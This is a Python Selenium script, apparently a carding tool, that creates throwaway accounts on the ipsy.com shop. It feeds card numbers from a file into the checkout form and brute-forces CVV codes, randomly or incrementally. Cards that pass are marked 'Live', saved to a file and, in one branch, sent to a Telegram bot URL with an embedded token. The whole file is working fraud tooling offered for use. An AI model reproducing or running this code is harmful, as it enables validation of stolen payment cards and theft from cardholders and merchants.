import os

import driver as driver

clear = lambda: os.system('cls')
pipselenium = lambda: os.system('pip install selenium')
pipselenium()
clear()
pipcolored = lambda: os.system('pip install colored')
pipcolored()
clear()
pipcolorama = lambda: os.system('pip install colorama')
pipcolorama()
pipgetmac = lambda: os.system('pip install getmac')
pipgetmac()
clear()
pipgtermcolor = lambda: os.system('pip install termcolor')
pipgtermcolor()
clear()
import time
clear()
import selenium
clear()
from selenium import webdriver
clear()
from getmac import get_mac_address as gma
clear()
from termcolor import colored
clear()
from time import sleep
clear()
import random
clear()
import colorama
import string
clear()
from colorama import Fore, Style
clear()
from selenium.webdriver.support.ui import WebDriverWait
clear()
from selenium.webdriver.common.by import By
clear()
from selenium.webdriver.support import expected_conditions as EC
clear()
from selenium.webdriver.support.ui import WebDriverWait
clear()
from selenium.webdriver.common.keys import Keys
clear()
from selenium.common.exceptions import *
clear()
from selenium.common.exceptions import TimeoutException
clear()
from selenium.common.exceptions import NoSuchElementException   
clear()
from selenium.common.exceptions import StaleElementReferenceException   
clear()
from selenium.webdriver.common.action_chains import ActionChains
clear()
print (Fore.RED+'''
    ___ ___ _                      _
    | __/_\   ______ __ _ __________________(_)_ _
    | _/ _ \ (_-<_-</ _` (_-<_-< | '  \+v2
    |_/_/ \_\/__/__/\__,_/_____/__________/_|_||_|
    '''+Fore.GREEN)
print("")
key = input(Fore.YELLOW + "Enter The Key : ")
if(key == "0"):
    clear()
    pass
else:
    print("Error Input Pls Close Program And Open Agine")
    sleep(20)
    driver.close()
    driver.quit()
print (Fore.RED+'''
                                  ___ ___ _                      _
                                  | __/_\   ______ __ _ __________________(_)_ _
                                  | _/ _ \ (_-<_-</ _` (_-<_-< | '  \+v2
                                  |_/_/ \_\/__/__/\__,_/_____/__________/_|_||_|
    '''+Fore.GREEN)
print("")
print(Fore.YELLOW+"------"+Fore.BLUE+">>"+Fore.GREEN+" Welcom To Check Cvv-Cvc Pls Choose Number Wht You Wont Check ............. :")
print("")
print(Fore.BLUE+"     -1"+Fore.GREEN+" If You Wont Check "+Fore.YELLOW+"Visa"+Fore.GREEN)
print(Fore.BLUE+"     -2"+Fore.GREEN+" If You Wont Check "+Fore.YELLOW+"Master"+Fore.GREEN)
print(Fore.BLUE+"     -3"+Fore.GREEN+" If You Wont Check "+Fore.YELLOW+"Amrecan Express"+Fore.GREEN)
print(Fore.BLUE+"     -4"+Fore.GREEN+" If You Wont Check "+Fore.YELLOW+"Discover"+Fore.GREEN)
print("")
xtype = input("Pls Enter Your Number Choosed : ")

regname='gehadTeaam'+str(random.randint(1, 10000))+'@gmail.com'
passReg = str(random.randint(12345678, 23456789))
def register():
    driver.get('https://www.ipsy.com/quiz/take/questions')

    NextQuestion = '/html/body/div[1]/div/div[2]/div[1]/div[2]/div/div[1]/div[2]/div[1]'

    for i in range(0,5):
        try:
            regclickele = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(NextQuestion))
            regclickele.click()
        except:
            pass


        driver.find_element_by_id('quiz-next-btn')
        NextButton = '/html/body/div[2]/div/div[2]/div[1]/div[2]/div/div[2]/button'
        regNextButtonclick = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_id('quiz-next-btn'))
        driver.execute_script("arguments[0].click();", regNextButtonclick)

    for i in range(0,10):

        driver.find_element_by_id('quiz-next-btn')
        WebDriverWait(driver, 40).until(lambda driver: driver.find_element_by_id('quiz-next-btn')).click()
        #driver.execute_script("arguments[0].click();", regNextButtonclick)

    print("Finished")

    WebDriverWait(driver, 60).until(lambda driver: driver.find_element_by_id('emailaddress')).send_keys(regname)

    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_id('password')).send_keys(passReg)
    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_name('user.age')).send_keys(25)

    terms = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_id('terms'))
    driver.execute_script("arguments[0].click();", terms)
    regNextButtonclick = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_id('quiz-detail-submit-btn'))
    driver.execute_script("arguments[0].click();", regNextButtonclick)



def login():
    print(regname)
    print(passReg)
    WebDriverWait(driver, 60).until(lambda driver: driver.find_element_by_id('id-username')).send_keys(regname)
    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_id('id-password')).send_keys(passReg)

    loginBtn='/html/body/div[6]/div/div/div/form/div[1]/div[4]/div/button'
    regNextButtonclick = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(loginBtn))
    driver.execute_script("arguments[0].click();", regNextButtonclick)




if xtype == '1':
    xxnum = 29
    xxtybexx = 'Visa'
elif xtype == '2':
    xxtybexx = 'MasterCard'
    xxnum = 29
elif xtype == '3':
    xxnum = 29
    xxtybexx = 'American Express'
elif xtype == '4':
    xxtybexx = 'Discover'
    xxnum = 29
else:
    print("Error Input Pls Close Program And Open Agine")
    sleep(20)
    driver.close()
    driver.quit()
options = webdriver.ChromeOptions()
options.add_argument("disable-infobars")
options.add_argument("--disable-extensions")
#options.add_argument("--headless")
options.add_argument("--log-level=3")
options.add_experimental_option('excludeSwitches', ['enable-logging'])
options.add_argument("--silent")
driver = webdriver.Chrome('../chromedriver.exe', chrome_options=options)
register()
driver.get('https://www.ipsy.com/shop/products/p-K-hjz-5Rzbv-dD64pJ2X?fbclid=IwAR3SHHxYAdmqTWBQNXYjYAubhmd_fZI0gwQ1bQ1fs9bJqs85KsYvyFxUjEs')
ccclick = '/html/body/helmet/div/div/div/div/div[2]/div[2]/div/div[1]/div[1]/div[2]/div/div[4]/div/div[2]/button'
ccclickEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccclick))
driver.execute_script("arguments[0].click();", ccclickEle)

#login()

cchref = '/html/body/helmet/div/div/div/div/div[2]/div[2]/div[2]/div/div[3]/div/div/div/div[1]/a'
cchrefEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cchref))
driver.execute_script("arguments[0].click();", cchrefEle)


ccfirstname = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[1]/div/label/input'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccfirstname)).send_keys('Joun')
cclastname = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[2]/div/label/input'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cclastname)).send_keys('Miame')
ccStaddress = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[3]/div/label/input'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccStaddress)).send_keys('624 Moians St622')
cccity = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[5]/div/label/input'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cccity)).send_keys('New York')
ccstate = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[6]/div/select'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccstate)).send_keys('New York')
cczipcode = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[7]/div/label/input'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cczipcode)).send_keys('10036')


#ccmail = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[1]/div/label/input'
#WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccmail)).send_keys('ahw',random.randint(1,9999999)+1,'qq',random.randint(1,9999999)+1,'@gm',random.randint(1,9999999)+1,'ail.com')
#ccpass = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[2]/div/label/input'
#WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccpass)).send_keys('Pa$$w0rd!')
#cccheck = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[3]/div/div[1]/label/input'
#cccheckEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cccheck))
#driver.execute_script("arguments[0].click();", cccheckEle)
print(Fore.RED+'-------------------------------------------------------------------')
print(Fore.BLUE+'-1 '+Fore.YELLOW+'>>> If You Wont Use Random CCv ')
print(Fore.BLUE+'-2 '+Fore.YELLOW+'>>> If You Wont Use Ccv Step Step ')
print(Fore.BLUE+'-3 '+Fore.YELLOW+'>>> If You Wont Use Card With Ccv ')
print(Fore.BLUE+'-4 '+Fore.YELLOW+'>>> If You Wont Use One Card On File And Ccv Step Step ')
print(Fore.RED+'-------------------------------------------------------------------')
typesss = input(Fore.GREEN+"Enter You Choose : ")
loopo = 0
if typesss == '1':
    x = 0
    while(x == 0):
        with open('ccrandom.txt','r') as fin:
            ccrandoms = fin.readlines()
        for ccrandom in ccrandoms:
            with open('cards.txt','r') as fin:
                cards = fin.readlines()
            for onecard in cards:
                cardNumbervlaue,expirationDateMonthvalue,expirationDateYearvalue,aasqfwgqwg = onecard.split('|')
                ccnum = '#app > div > form > div.large-gutter-grid.no-outer-gutter.grid.container-fluid > div:nth-child(2) > div.col-xs-12.col-md-4.col-md-offset-4 > div > div:nth-child(3) > div.col-xs-12 > div > label > input'
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_css_selector(ccnum)).send_keys(cardNumbervlaue)
                ccexpmonth = '//*[@id="app"]/div/form/div[1]/div[2]/div[2]/div/div[3]/div[2]/div/select'
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpmonth)).send_keys(expirationDateMonthvalue)
                ccexpyear = '//*[@id="app"]/div/form/div[1]/div[2]/div[2]/div/div[3]/div[3]/div/select'
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpyear)).send_keys(expirationDateYearvalue)
                ccvnum = '//*[@id="app"]/div/form/div[1]/div[2]/div[2]/div/div[3]/div[4]/div/label/input'
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccvnum)).send_keys(ccrandom)
                ccadd = '/html/body/div[1]/div/form/div[2]/button'
                ccaddEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccadd))
                driver.execute_script("arguments[0].click();", ccaddEle)
                z = 0
                while(z == 0):
                    if 'Card Declined. Please try a different card, or contact bank for details.' in driver.page_source:
                        z = 999
                        aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + ccrandom + " -- Dicline --"
                        print(Fore.RED + aa)
                        '''
                        driver.get('https://www.ipsy.com/order/checkout-detail?redirectUrl=%2Fshop%2Fcheckout%2Fplace-order')
                        ccfirstname = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[1]/div/label/input'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccfirstname)).send_keys('Joun')
                        cclastname = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[2]/div/label/input'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cclastname)).send_keys('Miame')
                        ccStaddress = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[3]/div/label/input'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccStaddress)).send_keys('624 Moians St622')
                        cccity = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[5]/div/label/input'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cccity)).send_keys('New York')
                        ccstate = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[6]/div/select'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccstate)).send_keys('New York')
                        cczipcode = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[7]/div/label/input'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cczipcode)).send_keys('10036')
                        ccmail = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[1]/div/label/input'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccmail)).send_keys('ahw',random.randint(1,9999999)+1,'qq',random.randint(1,9999999)+1,'@gm',random.randint(1,9999999)+1,'ail.com')
                        ccpass = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[2]/div/label/input'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccpass)).send_keys('Pa$$w0rd!')
                        cccheck = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[3]/div/div[1]/label/input'
                        cccheckEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cccheck))
                        driver.execute_script("arguments[0].click();", cccheckEle)
                        '''
                    if 'Please enter a valid credit card expiry date.' in driver.page_source:
                        aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + ccrandom + " -- Dicline --"
                        print(Fore.BLUE + aa)
                    if 'Review Your Order' in driver.page_source:
                        z = 999
                        aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + ccrandom + " -- Live --"
                        print(Fore.GREEN + aa)
                        telegram_bot = 'https://api.telegram.org/bot1803662358:AAGnduzD735_RI84HvY4Hbbz9Q-ytFAYEhs/sendMessage?chat_id=-551812912&text=%22'+aa+'%22'
                        driver.get(telegram_bot)
                        x = 0
                        with open('live.txt', 'r') as file:
                            valueoldgoodcard = file.read()
                        with open('live.txt', 'w') as f: 
                            f.write(str(valueoldgoodcard)+'\n'+str(aa))
                        driver.quit()
                        sleep(3000)
elif typesss == '2' or typesss == '4':
    print(Fore.RED+'-------------------------------------------------------------------')
    CCVa = int(input("Pls Enter Bigen CCV CVC CVV : "))
    CCV = CCVa
    x = 0
    while(x == 0):
        with open('cards.txt','r') as fin:
            cards = fin.readlines()
        for onecard in cards:
            cardNumbervlaue,expirationDateMonthvalue,expirationDateYearvalue,aasqfwgqwg = onecard.split('|')
            ccnum = '#app > div > form > div.large-gutter-grid.no-outer-gutter.grid.container-fluid > div:nth-child(2) > div.col-xs-12.col-md-4.col-md-offset-4 > div > div:nth-child(3) > div.col-xs-12 > div > label > input'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_css_selector(ccnum)).send_keys(cardNumbervlaue)
            ccexpmonth = '//*[@id="app"]/div/form/div[1]/div[2]/div[2]/div/div[3]/div[2]/div/select'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpmonth)).send_keys(expirationDateMonthvalue)
            ccexpyear = '//*[@id="app"]/div/form/div[1]/div[2]/div[2]/div/div[3]/div[3]/div/select'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpyear)).send_keys(expirationDateYearvalue)
            ccvnum = '//*[@id="app"]/div/form/div[1]/div[2]/div[2]/div/div[3]/div[4]/div/label/input'
            CCVm = str(CCV).zfill(3)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccvnum)).send_keys(CCVm)
            ccadd = '/html/body/div[1]/div/form/div[2]/button'
            ccaddEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccadd))
            driver.execute_script("arguments[0].click();", ccaddEle)
            z = 0
            while(z == 0):
                if 'Card Declined. Please try a different card, or contact bank for details.' in driver.page_source:
                    z = 999
                    aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + CCVm + " -- Dicline --"
                    print(Fore.RED + aa)
                    driver.get('https://www.ipsy.com/order/checkout-detail?redirectUrl=%2Fshop%2Fcheckout%2Fplace-order')
                    ccfirstname = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[1]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccfirstname)).send_keys('Joun')
                    cclastname = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[2]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cclastname)).send_keys('Miame')
                    ccStaddress = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[3]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccStaddress)).send_keys('624 Moians St622')
                    cccity = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[5]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cccity)).send_keys('New York')
                    ccstate = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[6]/div/select'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccstate)).send_keys('New York')
                    cczipcode = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[7]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cczipcode)).send_keys('10036')
                    ccmail = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[1]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccmail)).send_keys('ahw',random.randint(1,9999999)+1,'qq',random.randint(1,9999999)+1,'@gm',random.randint(1,9999999)+1,'ail.com')
                    ccpass = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[2]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccpass)).send_keys('Pa$$w0rd!')
                    cccheck = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[3]/div/div[1]/label/input'
                    cccheckEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cccheck))
                    driver.execute_script("arguments[0].click();", cccheckEle)
                if 'Review Your Order' in driver.page_source:
                    z = 999
                    aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + CCVm + " -- Live --"
                    print(Fore.GREEN + aa)
                    x = 0
                    with open('live.txt', 'r') as file:
                        valueoldgoodcard = file.read()
                    with open('live.txt', 'w') as f: 
                        f.write(str(valueoldgoodcard)+'\n'+str(aa))
                    driver.quit()
                    sleep(3000)
        CCV += 1
elif typesss == '3':
    print(Fore.RED+'-------------------------------------------------------------------')   
    x = 0
    while(x == 0):
        with open('cards.txt','r') as fin:
            cards = fin.readlines()
        for onecard in cards:
            cardNumbervlaue,expirationDateMonthvalue,expirationDateYearvalue,aasqfwgqwg,wwwwwwwwwwwww = onecard.split('|')
            ccnum = '#app > div > form > div.large-gutter-grid.no-outer-gutter.grid.container-fluid > div:nth-child(2) > div.col-xs-12.col-md-4.col-md-offset-4 > div > div:nth-child(3) > div.col-xs-12 > div > label > input'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_css_selector(ccnum)).send_keys(cardNumbervlaue)
            ccexpmonth = '//*[@id="app"]/div/form/div[1]/div[2]/div[2]/div/div[3]/div[2]/div/select'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpmonth)).send_keys(expirationDateMonthvalue)
            ccexpyear = '//*[@id="app"]/div/form/div[1]/div[2]/div[2]/div/div[3]/div[3]/div/select'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpyear)).send_keys(expirationDateYearvalue)
            ccvnum = '//*[@id="app"]/div/form/div[1]/div[2]/div[2]/div/div[3]/div[4]/div/label/input'
            CCVm = str(CCV).zfill(3)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccvnum)).send_keys(aasqfwgqwg)
            ccadd = '/html/body/div[1]/div/form/div[2]/button'
            ccaddEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccadd))
            driver.execute_script("arguments[0].click();", ccaddEle)
            z = 0
            while(z == 0):
                if 'Card Declined. Please try a different card, or contact bank for details.' in driver.page_source:
                    z = 999
                    aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + aasqfwgqwg + " -- Dicline --"
                    print(Fore.RED + aa)
                    driver.get('https://www.ipsy.com/order/checkout-detail?redirectUrl=%2Fshop%2Fcheckout%2Fplace-order')
                    ccfirstname = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[1]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccfirstname)).send_keys('Joun')
                    cclastname = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[2]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cclastname)).send_keys('Miame')
                    ccStaddress = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[3]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccStaddress)).send_keys('624 Moians St622')
                    cccity = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[5]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cccity)).send_keys('New York')
                    ccstate = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[6]/div/select'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccstate)).send_keys('New York')
                    cczipcode = '//*[@id="app"]/div/form/div[1]/div[1]/div[2]/div[2]/div/div[7]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cczipcode)).send_keys('10036')
                    ccmail = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[1]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccmail)).send_keys('ahw',random.randint(1,9999999)+1,'qq',random.randint(1,9999999)+1,'@gm',random.randint(1,9999999)+1,'ail.com')
                    ccpass = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[2]/div/label/input'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccpass)).send_keys('Pa$$w0rd!')
                    cccheck = '//*[@id="app"]/div/form/div[1]/div[3]/div/div[2]/div/div[3]/div/div[1]/label/input'
                    cccheckEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(cccheck))
                    driver.execute_script("arguments[0].click();", cccheckEle)
                if 'Review Your Order' in driver.page_source:
                    z = 999
                    aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + aasqfwgqwg + " -- Live --"
                    print(Fore.GREEN + aa)
                    x = 0
                    with open('live.txt', 'r') as file:
                        valueoldgoodcard = file.read()
                    with open('live.txt', 'w') as f: 
                        f.write(str(valueoldgoodcard)+'\n'+str(aa))
                    driver.quit()
                    sleep(3000)
            